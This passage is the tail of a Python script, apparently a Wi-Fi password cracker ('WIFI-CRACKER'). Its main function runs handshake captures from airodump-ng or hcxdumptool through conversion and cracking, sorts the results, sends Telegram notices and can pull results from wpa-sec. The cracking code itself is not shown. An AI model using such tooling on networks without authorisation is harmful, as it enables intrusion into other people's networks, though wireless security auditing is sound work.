        print(f"Live progress: tail -f {logf}")
        return 0

    banner(opts)

    if args:
        target = Path(args[0]).expanduser()
        OK(f"Mode: SINGLE -> {target}")
        result = process_one(target, opts)
        send_telegram(f"[WIFI-CRACKER] RUN FINISHED: {target.name} -> {result}")
        return 0

    OK("Mode: ALL -> convert + crack every pending capture, one by one")
    print()
    pending = discover_pending()
    if not pending:
        WARN("Nothing in handshakes/pending/.")
        WARN("Drop a .pcap (Porkchop / airodump-ng / hcxdumptool) in there, "
             "or pass a file path.")
        return 0
    OK(f"Found {len(pending)} pending item(s):")
    for p in pending:
        print(f"    {p.name}")
    print()

    summary = {"success": 0, "fail": 0, "converted": 0}
    for p in pending:
        r = process_one(p, opts)
        summary[r] = summary.get(r, 0) + 1
        print()

    print("=" * 62)
    OK(f"Done. success={summary['success']}  fail={summary['fail']}"
       + (f"  converted={summary['converted']}" if summary.get("converted") else ""))
    print(f"  success -> {SUCCESS}")
    print(f"  fail    -> {FAIL}")
    print("=" * 62)

    if opts.wpasec and not opts.dry and not opts.convert_only:
        wpasec_pull_summary()

    send_telegram(
        f"[WIFI-CRACKER] RUN FINISHED \u2728  success={summary['success']}  fail={summary['fail']}")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
